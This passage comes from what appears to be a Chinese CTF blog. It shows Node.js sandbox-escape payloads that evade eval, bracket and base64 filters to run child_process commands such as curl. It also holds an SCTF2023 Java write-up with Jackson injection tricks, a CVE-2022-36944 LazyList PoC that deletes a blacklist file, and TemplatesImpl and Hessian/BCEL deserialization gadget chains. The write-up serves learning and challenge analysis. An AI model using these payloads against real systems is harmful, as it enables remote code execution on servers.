class="hljs-keyword">x</span><span class="hljs-number">2</span>e\<span class="hljs-keyword">x</span><span class="hljs-number">69</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span>e\<span class="hljs-keyword">x</span><span class="hljs-number">63</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">75</span>\<span class="hljs-keyword">x</span><span class="hljs-number">64</span>\<span class="hljs-keyword">x</span><span class="hljs-number">65</span>\<span class="hljs-keyword">x</span><span class="hljs-number">73</span>\<span class="hljs-keyword">x</span><span class="hljs-number">28</span>\<span class="hljs-keyword">x</span><span class="hljs-number">27</span>\<span class="hljs-keyword">x</span><span class="hljs-number">65</span>\<span class="hljs-keyword">x</span><span class="hljs-number">76</span>\<span class="hljs-keyword">x</span><span class="hljs-number">61</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">27</span>\<span class="hljs-keyword">x</span><span class="hljs-number">29</span>\<span class="hljs-keyword">x</span><span class="hljs-number">29</span>\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>d\<span class="hljs-keyword">x</span><span class="hljs-number">28</span>\<span class="hljs-keyword">x</span><span class="hljs-number">27</span>\<span class="hljs-keyword">x</span><span class="hljs-number">67</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">62</span>\<span class="hljs-keyword">x</span><span class="hljs-number">61</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">2</span>e\<span class="hljs-keyword">x</span><span class="hljs-number">70</span>\<span class="hljs-keyword">x</span><span class="hljs-number">72</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">63</span>\<span class="hljs-keyword">x</span><span class="hljs-number">65</span>\<span class="hljs-keyword">x</span><span class="hljs-number">73</span>\<span class="hljs-keyword">x</span><span class="hljs-number">73</span>\<span class="hljs-keyword">x</span><span class="hljs-number">2</span>e\<span class="hljs-keyword">x</span><span class="hljs-number">6</span>d\<span class="hljs-keyword">x</span><span class="hljs-number">61</span>\<span class="hljs-keyword">x</span><span class="hljs-number">69</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span>e\<span class="hljs-keyword">x</span><span class="hljs-number">4</span>d\<span class="hljs-keyword">x</span><span class="hljs-number">6</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">64</span>\<span class="hljs-keyword">x</span><span class="hljs-number">75</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">65</span>\<span class="hljs-keyword">x</span><span class="hljs-number">2</span>e\<span class="hljs-keyword">x</span><span class="hljs-number">63</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">6</span>e\<span class="hljs-keyword">x</span><span class="hljs-number">73</span>\<span class="hljs-keyword">x</span><span class="hljs-number">74</span>\<span class="hljs-keyword">x</span><span class="hljs-number">72</span>\<span class="hljs-keyword">x</span><span class="hljs-number">75</span>\<span class="hljs-keyword">x</span><span class="hljs-number">63</span>\<span class="hljs-keyword">x</span><span class="hljs-number">74</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">72</span>\<span class="hljs-keyword">x</span><span class="hljs-number">2</span>e\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">61</span>\<span class="hljs-keyword">x</span><span class="hljs-number">64</span>\<span class="hljs-keyword">x</span><span class="hljs-number">28</span>\<span class="hljs-keyword">x</span><span class="hljs-number">22</span>\<span class="hljs-keyword">x</span><span class="hljs-number">63</span>\<span class="hljs-keyword">x</span><span class="hljs-number">68</span>\<span class="hljs-keyword">x</span><span class="hljs-number">69</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">64</span>\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">70</span>\<span class="hljs-keyword">x</span><span class="hljs-number">72</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">63</span>\<span class="hljs-keyword">x</span><span class="hljs-number">65</span>\<span class="hljs-keyword">x</span><span class="hljs-number">73</span>\<span class="hljs-keyword">x</span><span class="hljs-number">73</span>\<span class="hljs-keyword">x</span><span class="hljs-number">22</span>\<span class="hljs-keyword">x</span><span class="hljs-number">29</span>\<span class="hljs-keyword">x</span><span class="hljs-number">2</span>e\<span class="hljs-keyword">x</span><span class="hljs-number">65</span>\<span class="hljs-keyword">x</span><span class="hljs-number">78</span>\<span class="hljs-keyword">x</span><span class="hljs-number">65</span>\<span class="hljs-keyword">x</span><span class="hljs-number">63</span>\<span class="hljs-keyword">x</span><span class="hljs-number">53</span>\<span class="hljs-keyword">x</span><span class="hljs-number">79</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span>e\<span class="hljs-keyword">x</span><span class="hljs-number">63</span>\<span class="hljs-keyword">x</span><span class="hljs-number">28</span>\<span class="hljs-keyword">x</span><span class="hljs-number">22</span>\<span class="hljs-keyword">x</span><span class="hljs-number">63</span>\<span class="hljs-keyword">x</span><span class="hljs-number">75</span>\<span class="hljs-keyword">x</span><span class="hljs-number">72</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">20</span>\<span class="hljs-keyword">x</span><span class="hljs-number">31</span>\<span class="hljs-keyword">x</span><span class="hljs-number">32</span>\<span class="hljs-keyword">x</span><span class="hljs-number">37</span>\<span class="hljs-keyword">x</span><span class="hljs-number">2</span>e\<span class="hljs-keyword">x</span><span class="hljs-number">30</span>\<span class="hljs-keyword">x</span><span class="hljs-number">2</span>e\<span class="hljs-keyword">x</span><span class="hljs-number">30</span>\<span class="hljs-keyword">x</span><span class="hljs-number">2</span>e\<span class="hljs-keyword">x</span><span class="hljs-number">31</span>\<span class="hljs-keyword">x</span><span class="hljs-number">3</span>a\<span class="hljs-keyword">x</span><span class="hljs-number">31</span>\<span class="hljs-keyword">x</span><span class="hljs-number">32</span>\<span class="hljs-keyword">x</span><span class="hljs-number">33</span>\<span class="hljs-keyword">x</span><span class="hljs-number">34</span>\<span class="hljs-keyword">x</span><span class="hljs-number">22</span>\<span class="hljs-keyword">x</span><span class="hljs-number">29</span>\<span class="hljs-keyword">x</span><span class="hljs-number">27</span>\<span class="hljs-keyword">x</span><span class="hljs-number">29</span>&#x27;)</code></pre></div><p>如果过滤了<code>eval</code>关键字，可以用<code>includes(&#39;eva&#39;)</code>来搜索<code>eval</code>函数，也可以用<code>startswith(&#39;eva&#39;)</code>来搜索</p><h3 id="过滤中括号"><a href="#过滤中括号" class="headerlink" title="过滤中括号"></a>过滤中括号</h3><blockquote><p><code>Reflect.get(target, propertyKey[, receiver])</code>的作用是获取对象身上某个属性的值，类似于<code>target[name]</code>。</p></blockquote><p>所以取eval函数的方式可以变成</p><div class="code-wrapper"><pre><code class="hljs js"><span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(<span class="hljs-variable language_">global</span>, <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(<span class="hljs-variable language_">global</span>).<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">x</span>=&gt;</span>x.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;eva&#x27;</span>)))</code></pre></div><div class="code-wrapper"><pre><code class="hljs js"><span class="hljs-built_in">eval</span>(<span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(<span class="hljs-string">`Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik=`</span>,<span class="hljs-string">`base64`</span>).<span class="hljs-title function_">toString</span>())</code></pre></div><p>这里过滤了<code>base64</code>，可以直接换成</p><div class="code-wrapper"><pre><code class="hljs js"><span class="hljs-string">`base`</span>.<span class="hljs-title function_">concat</span>(<span class="hljs-number">64</span>)</code></pre></div><p>过滤掉了<code>Buffer</code>，可以换成</p><div class="code-wrapper"><pre><code class="hljs js"><span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(<span class="hljs-variable language_">global</span>, <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(<span class="hljs-variable language_">global</span>).<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">x</span>=&gt;</span>x.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">`Buf`</span>)))</code></pre></div><p>要拿到<code>Buffer.from</code>方法，可以通过下标</p><div class="code-wrapper"><pre><code class="hljs js"><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">values</span>(<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(<span class="hljs-variable language_">global</span>, <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(<span class="hljs-variable language_">global</span>).<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">x</span>=&gt;</span>x.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">`Buf`</span>))))[<span class="hljs-number">1</span>]</code></pre></div><p>但问题在于，关键字还过滤了中括号，这一点简单，再加一层<code>Reflect.get</code></p><div class="code-wrapper"><pre><code class="hljs js"><span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">values</span>(<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(<span class="hljs-variable language_">global</span>, <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(<span class="hljs-variable language_">global</span>).<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">x</span>=&gt;</span>x.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">`Buf`</span>)))),<span class="hljs-number">1</span>)</code></pre></div><p>所以基本payload变成</p><div class="code-wrapper"><pre><code class="hljs js"><span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">values</span>(<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(<span class="hljs-variable language_">global</span>, <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(<span class="hljs-variable language_">global</span>).<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">x</span>=&gt;</span>x.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">`Buf`</span>)))),<span class="hljs-number">1</span>)(<span class="hljs-string">`Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik=`</span>,<span class="hljs-string">`base`</span>.<span class="hljs-title function_">concat</span>(<span class="hljs-number">64</span>)).<span class="hljs-title function_">toString</span>()</code></pre></div><p>eval只会进行解码，不会执行，所以要再套一层eval</p><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(<span class="hljs-variable language_">global</span>, <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(<span class="hljs-variable language_">global</span>).<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">x</span>=&gt;</span>x.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;eva&#x27;</span>)))(<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">values</span>(<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(<span class="hljs-variable language_">global</span>, <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(<span class="hljs-variable language_">global</span>).<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">x</span>=&gt;</span>x.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">`Buf`</span>)))),<span class="hljs-number">1</span>)(<span class="hljs-string">`Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik=`</span>,<span class="hljs-string">`base`</span>.<span class="hljs-title function_">concat</span>(<span class="hljs-number">64</span>)).<span class="hljs-title function_">toString</span>())</code></pre></div><p>也可以拿到eval后写入16进制字符串</p><div class="code-wrapper"><pre><code class="hljs r">Reflect.get<span class="hljs-punctuation">(</span>global<span class="hljs-punctuation">,</span> Reflect.ownKeys<span class="hljs-punctuation">(</span>global<span class="hljs-punctuation">)</span>.find<span class="hljs-punctuation">(</span>x<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span>x.includes<span class="hljs-punctuation">(</span>`eva`<span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">(</span>`\x67\x6c\x6f\x62\x61\x6c\x2e\x70\x72\x6f\x63\x65\x73\x73\x2e\x6d\x61\x69\x6e\x4d\x6f\x64\x75\x6c\x65\x2e\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72\x2e\x5f\x6c\x6f\x61\x64\x28\x22\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73\x22\x29\x2e\x65\x78\x65\x63\x53\x79\x6e\x63\x28\x22\x63\x75\x72\x6c\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x31\x32\x33\x34\x22\x29`<span class="hljs-punctuation">)</span></code></pre></div>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>提及rasp的java题</title>
    <link href="/2023/11/15/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/"/>
    <url>/2023/11/15/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="“提及“-rasp的java题"><a href="#“提及“-rasp的java题" class="headerlink" title="“提及“ rasp的java题"></a>“提及“ rasp的java题</h1><h2 id="SCTF2023-hellojava"><a href="#SCTF2023-hellojava" class="headerlink" title="SCTF2023  hellojava"></a>SCTF2023  hellojava</h2><p>出题人说不想堆难度，于是把黑名单和不出网和rasp都去掉了</p><p>由于没做过这题，直接看多个人题解，我差点以为这是两道题，预期和非预期的exp完全不同</p><p>由于什么都不会，所以接下来会分析的比较细致</p><p><strong>开始</strong></p><div class="code-wrapper"><pre><code class="hljs kotlin"><span class="hljs-meta">@JsonCreator</span><span class="hljs-keyword">public</span> MyBean(<span class="hljs-meta">@JsonProperty(<span class="hljs-string">&quot;Base64Code&quot;</span>)</span> String Base64Code, <span class="hljs-meta">@JacksonInject</span> <span class="hljs-built_in">Boolean</span> IfInput) &#123;   <span class="hljs-keyword">this</span>.Base64Code = Base64Code;   <span class="hljs-keyword">this</span>.IfInput = IfInput;&#125;</code></pre></div><h4 id="了解这三个注解"><a href="#了解这三个注解" class="headerlink" title="了解这三个注解"></a>了解这三个注解</h4><div class="code-wrapper"><pre><code class="hljs less"><span class="hljs-variable">@JsonCreator</span>加在构造函数上面用于反序列化<span class="hljs-variable">@JsonProperty</span>指定Json数据中该属性的键名<span class="hljs-comment">//上面这个例子为例，即使变量名不叫Base64Code，序列化后该值的键名一定是Base64Code</span><span class="hljs-variable">@JacksonInject</span>有该注解的属性它的值不能从Json中获取</code></pre></div><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;    <span class="hljs-type">MyBean</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> (MyBean)mapper.readValue(Base64.decode(BaseJson), MyBean.class);    System.out.println(user);    <span class="hljs-keyword">if</span> (user.getIfInput()) &#123;        <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(java.util.Base64.getDecoder().decode(param));        <span class="hljs-type">NoObjectInputStream</span> <span class="hljs-variable">NoInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NoObjectInputStream</span>(inputStream);        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> NoInputStream.readObject();        <span class="hljs-type">String</span> <span class="hljs-variable">HelloList</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Hello</span>()).DoSomething((LazyList)obj);        <span class="hljs-keyword">return</span> HelloList;    &#125;</code></pre></div><p>我们要让IfInput反序列化回来的结果为true，但又不能赋值，这便是第一个考点</p><p>这与Jackson的处理逻辑相关</p><p><a href="http://blog.kuron3k0.vip/2021/04/10/vulns-of-misunderstanding-annotation/">误解注解产生的漏洞 - kuron3k0的博客 | kuron3k0’s Blog</a></p><div class="code-wrapper"><pre><code class="hljs crmsh">调用readValue后，进入到_deserializeUsingPropertyBased函数，这里循环处理我们的键值对，当前正在处理空键值，propName为空根据propName会去_propertyLookup中取出对应的creator <span class="hljs-keyword">property</span><span class="hljs-title"></span>，从名字也能看出来，这个就是我们之前的注解生成的，username和password都有对应同名字的键名，但是标注了@JacksonInject键名为空随后调用_deserializeWithErrorWrapping反序列化得到对应的值，并赋值给buffer中的_creatorParameters当处理完所有键值对后，取出_creatorParameters调用User的构造函数</code></pre></div><p>调试可以发现，IfInput对应的键名为空，所以获取的是<code>&quot;&quot;</code>的值</p><p>给出答案，让IfInput的键名为空  即可给IfInput赋值</p><div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;base64Code&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;AAAAAAAA&quot;</span><span class="hljs-punctuation">&#125;</span></code></pre></div><p>当然这种 trick 也只适用于 creator 中只有一个 <code>@JacksonInject</code> 注解的，如果有多个注解，那么 <code>&quot;&quot;</code> 的索引位置只会是一个，一样会走到 <code>_findMissing</code></p><p>后面虽然不同，但都是用<code>scala-library</code>依赖的<code>CVE-2022-36944</code></p><h3 id="非预期解-（简单易理解，但是有问题，算了能解出来都是好方法）"><a href="#非预期解-（简单易理解，但是有问题，算了能解出来都是好方法）" class="headerlink" title="非预期解 （简单易理解，但是有问题，算了能解出来都是好方法）"></a>非预期解 （简单易理解，但是有问题，算了能解出来都是好方法）</h3><p>题目本身的 <code>security/blacklist.txt</code> 是打包的资源文件，<strong>远程能打是因为出题人在官方 WP 中说到了远程环境其实没有黑名单和 rasp</strong></p><p>大概思路    删除黑名单 ，然后直接Jackson反序列化</p><p><a href="https://github.com/yarocher/lazylist-cve-poc">yarocher&#x2F;lazylist-cve-poc: POC for the CVE-2022-36944 vulnerability exploit (github.com)</a></p><p>唉，打包又出问题了</p><p><code>mvn -q exec:java -Dexec.mainClass=&quot;poc.cve.lazylist.payload.Main&quot; -Dexec.args=&quot;./security/blacklist.txt false&quot;</code></p><p>得到的base64拿去反序列化，就能删除黑名单</p><div class="code-wrapper"><pre><code class="hljs reasonml">Templates templates = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TemplatesImpl()</span>;Class c = templates.get<span class="hljs-constructor">Class()</span>;Field nameField = c.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;_name&quot;</span>)</span>;nameField.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;nameField.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);Field bytecodeField = c.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>)</span>; <span class="hljs-comment">// bytecode 是个二维数组</span>bytecodeField.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;byte<span class="hljs-literal">[]</span> code = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Files</span>.</span></span>read<span class="hljs-constructor">AllBytes(Paths.<span class="hljs-params">get</span>(<span class="hljs-string">&quot;target\\test-classes\\evil.class&quot;</span>)</span>);byte<span class="hljs-literal">[]</span><span class="hljs-literal">[]</span> codes = &#123; code &#125;;bytecodeField.set(templates,codes);Field tfactoryField = c.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>)</span>;tfactoryField.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;tfactoryField.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-constructor">TransformerFactoryImpl()</span>);POJONode pojoNode = <span class="hljs-keyword">new</span> <span class="hljs-constructor">POJONode(<span class="hljs-params">templates</span>)</span>;BadAttributeValueExpException badAttributeValueExpException = <span class="hljs-keyword">new</span> <span class="hljs-constructor">BadAttributeValueExpException(11)</span>;set<span class="hljs-constructor">FiledValue(<span class="hljs-params">badAttributeValueExpException</span>,<span class="hljs-string">&quot;val&quot;</span>,<span class="hljs-params">pojoNode</span>)</span>;serialize(badAttributeValueExpException);</code></pre></div><h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p><a href="https://github.com/scala/scala/pull/10118">为了安全起见，请阻止在“LazyList”反序列化期间执行“Function0” by lrytz ·拉取请求 #10118 ·scala&#x2F;scala (github.com)</a></p><p>LazyList在readObject时会调用任意的Function0</p><p>但实际远程环境是 Function1。看了exp感觉跟 cve 关系不大 ， 在 LazyList 中 map 加入一个函数，那么由于懒加载的特性，显然只会在真正访问的时候才能触发emmm，当 map 里填入箭头函数的时候，在最新版本 （2.13.11）也能够触发</p><div class="code-wrapper"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyFun</span> &#123;   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-title class_">Function1</span>&lt;<span class="hljs-title class_">Object</span>, <span class="hljs-title class_">Object</span>&gt; <span class="hljs-title function_">myFun</span>(<span class="hljs-params"></span>) &#123;      <span class="hljs-keyword">return</span> <span class="hljs-title class_">MyFun</span>$.<span class="hljs-variable constant_">MODULE</span>$.<span class="hljs-title function_">myFun</span>();   &#125;         <span class="hljs-keyword">public</span> final <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyFun$</span> &#123;   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> final <span class="hljs-title class_">MyFun</span>$ <span class="hljs-variable constant_">MODULE</span>$ = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyFun</span><span class="hljs-title function_">$</span>();   <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> final <span class="hljs-title class_">Function1</span>&lt;<span class="hljs-title class_">Object</span>, <span class="hljs-title class_">Object</span>&gt; myFun = (x) -&gt; &#123;<span class="hljs-comment">//      .MODULE$.println(System.getProperty(&quot;user.dir&quot;));</span>      <span class="hljs-keyword">try</span> &#123;         (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Hello</span>()).<span class="hljs-title function_">sayHello</span>(<span class="hljs-string">&quot;list.txt&quot;</span>);      &#125;</code></pre></div><p>通过myfun调用sayhello读取文件然后进行hessian反序列化，因为有一个路由是写文件的，内容可控</p><p>hessian还没学，后来出个新文章学习</p><p>直接看别人的思路</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> NoInputStream.readObject();<span class="hljs-type">String</span> <span class="hljs-variable">HelloList</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Hello</span>()).DoSomething((LazyList)obj);   |  \/    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">DoSomething</span><span class="hljs-params">(LazyList list)</span> &#123;    <span class="hljs-type">String</span> <span class="hljs-variable">HelloList</span> <span class="hljs-operator">=</span> list.toString();    list.tail().head();     <span class="hljs-comment">//触发LazyList的function</span>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello&quot;</span> + HelloList;&#125;   |  \/<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Function1&lt;Object, Object&gt; myFun = (x) -&gt; &#123;<span class="hljs-keyword">try</span> &#123; (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Hello</span>()).sayHello(<span class="hljs-string">&quot;list.txt&quot;</span>);   |  \/<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String path)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;    ... 读取文件的操作<span class="hljs-type">byte</span>[] decodedBytes = Base64.getDecoder().decode(sb.toString());<span class="hljs-keyword">new</span> <span class="hljs-title class_">Des</span>(decodedBytes);    |   \/<span class="hljs-keyword">public</span> <span class="hljs-title function_">Des</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] decodedBytes)</span> <span class="hljs-keyword">throws</span> IOException &#123;        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(decodedBytes);        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(bais);        <span class="hljs-type">ClassNameResolver</span> <span class="hljs-variable">resolver</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassNameResolver</span>();        <span class="hljs-type">NameBlackListFilter</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NameBlackListFilter</span>(Blacklist.blacklist);        resolver.addFilter(filter);        input.getSerializerFactory().setClassNameResolver(resolver);        input.readObject();    &#125;</code></pre></div><p>hessian使用onlyJDK的思路</p><p>给出官方WP</p><div class="code-wrapper"><pre><code class="hljs reasonml">import com.caucho.hessian.io.Hessian2Input;import com.caucho.hessian.io.Hessian2Output;import com.sun.org.apache.bcel.internal.Repository;import com.sun.org.apache.bcel.internal.classfile.JavaClass;import com.sun.org.apache.bcel.internal.classfile.Utility;import sun.reflect.ReflectionFactory;import sun.security.pkcs.PKCS9Attribute;import sun.security.pkcs.PKCS9Attributes;import sun.swing.SwingLazyValue;import javax.swing.*;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.util.Base64;public <span class="hljs-keyword">class</span> test &#123;    public static String <span class="hljs-constructor">Code()</span>throws Exception &#123;        PKCS9Attributes s = create<span class="hljs-constructor">WithoutConstructor(PKCS9Attributes.<span class="hljs-params">class</span>)</span>;        UIDefaults uiDefaults = <span class="hljs-keyword">new</span> <span class="hljs-constructor">UIDefaults()</span>;        JavaClass evil = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Repository</span>.</span></span>lookup<span class="hljs-constructor">Class(Evil.<span class="hljs-params">class</span>)</span>;        String payload = <span class="hljs-string">&quot;$$BCEL$$&quot;</span> + <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Utility</span>.</span></span>encode(evil.get<span class="hljs-constructor">Bytes()</span>, <span class="hljs-literal">true</span>);        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="hljs-keyword">new</span> <span class="hljs-constructor">SwingLazyValue(<span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.JavaWrapper&quot;</span>, <span class="hljs-string">&quot;_main&quot;</span>, <span class="hljs-params">new</span> Object[]&#123;<span class="hljs-params">new</span> String[]&#123;<span class="hljs-params">payload</span>&#125;&#125;)</span>);        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">s</span>,<span class="hljs-string">&quot;attributes&quot;</span>,<span class="hljs-params">uiDefaults</span>)</span>;        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayOutputStream()</span>;        Hessian2Output out = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Hessian2Output(<span class="hljs-params">baos</span>)</span>;        baos.write(<span class="hljs-number">67</span>);        out.get<span class="hljs-constructor">SerializerFactory()</span>.set<span class="hljs-constructor">AllowNonSerializable(<span class="hljs-params">true</span>)</span>;        out.write<span class="hljs-constructor">Object(<span class="hljs-params">s</span>)</span>;        out.flush<span class="hljs-constructor">Buffer()</span>;        String base64Str = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Base64</span>.</span></span>get<span class="hljs-constructor">Encoder()</span>.encode<span class="hljs-constructor">ToString(<span class="hljs-params">baos</span>.<span class="hljs-params">toByteArray</span>()</span>);        return base64Str;    &#125;    public static void main(String<span 